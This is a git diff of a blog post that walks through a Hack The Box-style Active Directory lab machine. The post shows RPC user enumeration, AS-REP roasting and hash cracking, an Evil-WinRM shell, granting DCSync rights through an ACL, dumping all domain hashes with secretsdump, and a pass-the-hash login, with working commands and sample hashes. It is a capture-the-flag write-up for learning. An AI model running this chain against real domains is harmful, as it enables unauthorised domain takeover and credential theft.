@@ -5,13 +5,13 @@ draft: false
 ---
 
 Exploit a domain controller that allows us to enumerate users over RPC, attack Kerberos 
-with AS-REP Roasting, and use Win-RM to get a shell. Then using Bloodhound we can take
+with AS-REP Roasting, and use Evil-WinRM to get a shell. Then using Bloodhound we can take
 advantage of the permissions of some user that allow us to dump admin hash to get a shell as admin.
 <!--more-->
 
 # **Introduction**
 
-It's been a long time since I posted my last writeup, now I'm back. We start with a cool box to begin with Active Directory.
+It's been a long time since I posted my last writeup, now I'm back. We start with a cool box to begin with <span style="color:#85B5EB">Active Directory</span>.
 
 ## **Nmap**
 Let's start with the nmap scan which shows us typical open ports for a Windows machine :
@@ -48,13 +48,13 @@ kali@kali# smbmap -H 10.10.10.161
         ----     -----------                                               
 [!] Access Denied
 ```
-Unfortunately, we can't access the shares without a password but don't worry we can connect as null user with rpcclient to enumerate users and groups : 
+Unfortunately, we can't access the shares without a password but don't worry we can connect as null user with  <span style="color:#85B5EB">rpcclient</span> to enumerate  <span style="color:#85B5EB">users</span> and  <span style="color:#85B5EB">groups</span> : 
 
 ```text
 kali@kali# rpcclient -U "" -N 10.10.10.161
 rpcclient $>
 ```
-Then use enumdomusers to get a list of users :
+Then use enumdomusers command to get a list of users :
 
 ```text
 rpcclient $> enumdomusers              
@@ -67,22 +67,22 @@ user:[andy] rid:[0x47e]
 user:[mark] rid:[0x47f]                
 user:[santi] rid:[0x480]
 ```
-Above you can see a list of potential user which might be vulnerable to something.
+Above you can see a list of potential user which might be  <span style="color:#85B5EB">vulnerable</span> to something.
 
 ## **Own user svc-alfresco**
 
- Now what can we do with these users ? We can use a method called AS-REP Roasting to get the password hashes of these users.
-This method require the user to have the "don't require Kerberos pre-authentication" option enabled. We can check this with a script from impacket collection : 
+ Now what can we do with these users ? We can use a method called  <span style="color:#85B5EB">AS-REP Roasting</span>  to get the password hashes of these users.
+This method require the user to have the <span style="color:#85B5EB"> don't require Kerberos pre-authentication</span>  option enabled. We can check this with a script from impacket collection : 
 ``` 
 /opt/tool/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 -usersfile users.txt htb/
 ```
-Jackpot ! We got the hashe of the user svc-alfresco. We can crack his hashes with hashcat :
+Jackpot ! We got the hash of the user <span style="color:#85B5EB">svc-alfresco</span>. We can crack his hashes with hashcat :
 ```
 hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt 
 ```
-Hashcat easily cracked the password : s3rvice.
+Hashcat easily cracked the password : <span style="color:#85B5EB">s3rvice</span>.
 
-Finally we can use these credentials to log in as svc-alfresco using Evil-WinRM :
+Finally we can use these credentials to log in as svc-alfresco using <span style="color:#85B5EB">Evil-WinRM</span> :
 
 ```
 kali@kali# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
@@ -101,22 +101,22 @@ From There we can grab the user flag :
 
 ## **Time for Root**
 
-From there I just collected data using bloodhound-python
-so we can import the .json files in BloodHound :
+From there I just collected data using  <span style="color:#85B5EB">bloodhound-python</span>
+so we can import the  <span style="color:#85B5EB">.json files</span> in BloodHound :
 ```
 bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns 10.10.10.161 -c DcOnly
 ```
 
-After importing the data, under “Queries”, just click on  “Find Shorter Paths to Domain Admin”, and we get the following graph:
+After importing the data, under  <span style="color:#85B5EB">Queries</span>, just click on   <span style="color:#85B5EB">Find Shorter Paths to Domain Admin</span>, and we get the following graph:
 ![image text](/bloodhound.png)
 
-Basically svc-alfresco is a member of Privileged IT Account, which is a member of Account Operators, it’s like my user is a member of Account Operators and Account Operators has Generic All privilege on the Exchange Windows Permissions group. If I click on the edge in Bloodhound, and select help, there’s an “Abuse Info” tab in the pop up that displays:
+Basically svc-alfresco is a member of  <span style="color:#85B5EB">Privileged IT Account</span>, which is a member of  <span style="color:#85B5EB">Account Operators</span>, so it’s like my user is a member of <span style="color:#85B5EB">Account Operators</span> and Account Operators has Generic All privilege on the <span style="color:#85B5EB">Exchange Windows Permissions</span> group. If I click on the edge in Bloodhound, and select help, there’s an <span style="color:#85B5EB">Abuse Info</span> tab in the pop up that displays:
 
 ![image text](/abuse_info.png)
 
-Note that the Exchange Windows Permissions group has WriteDacl
+The Exchange Windows Permissions group has <span style="color:#85B5EB">WriteDacl</span>
 privileges on the Domain. The WriteDACL privilege gives a user the ability to add ACLs to an
-object. In other words we can add a user to this group and give them DCSync privileges.
+object. In other words we can add a user to this group and give them <span style="color:#85B5EB">DCSync privileges<span>.
 
 Let's go back to our shell and create a new user, add him to Exchange Windows Permissions group :
 
@@ -127,7 +127,7 @@ Let's go back to our shell and create a new user, add him to Exchange Windows Pe
 *Evil-WinRM* PS C:\Users\svc-alfresco\desktop> net group "Exchange Windows Permissions" achla /add
 ```
 
-After importing PowerView script we can
+After importing [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script we can
 use the Add-ObjectACL with achla's credentials, and give him DCSync rights.
 
 ```
@@ -136,7 +136,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('htb\achla', $pass)
 Add-ObjectAcl -Credential $Cred -PrincipalIdentity achla -Rights DCSync
 ```
 
-To conclude I used the secretdump script from impacket to get the NTLM hashes for all domain users
+To conclude I used the <span style="color:#85B5EB">secretdump</span> script from impacket to get the NTLM hashes for all domain users.
 ```
 kali@kali# /opt/tool/impacket/examples/secretsdump.py achla:Pa$$w0rd!@10.10.10.161
 
@@ -152,7 +152,7 @@ htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16
 [*] Cleaning up... 
 ```
 
-We've got the hash for Administrator, let's just login using psexec
+We've got the hash for Administrator, let's just login using psexec (or Evil-WinRM).
 
 ```
 kali@kali# /opt/tool/impacket/examples/psexec.py Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
